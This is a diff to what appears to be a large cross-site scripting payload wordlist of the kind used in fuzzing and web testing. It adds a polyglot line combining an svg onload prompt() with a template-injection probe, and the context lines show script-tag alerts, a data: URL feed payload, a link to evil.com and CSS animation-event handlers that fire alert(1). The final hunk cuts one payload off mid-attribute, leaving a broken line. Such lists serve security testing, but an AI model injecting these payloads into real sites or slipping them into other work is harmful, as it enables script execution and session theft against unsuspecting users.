@@ -6,6 +6,7 @@
 <textarea>Html injected</textarea>
 <h1><b><i>hello</h1></b></i>
 <a href=http://evil.com>YOCLICKTHIS</a>
+'"><svg/onload=prompt(7);>{{7*7}}
 
 <script>alert(1)</script>
 <scr ipt>alert(1)</scr ipt>
@@ -13926,5 +13927,4 @@ feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+'
 <style>@keyframes slidein {}</style><img2 style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></img2>
 <style>@keyframes slidein {}</style><input style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></input>
 <style>@keyframes slidein {}</style><input style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></input>
-<style>@keyframes slidein {}</style><input2 style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></input2>
-<style>@keyframes slidein {}</style><input2 style="animation-duration:1s;animation-name
+<style>@keyframes slidein {}</style><input2 style="animation-duration:1s;animation-name:slide
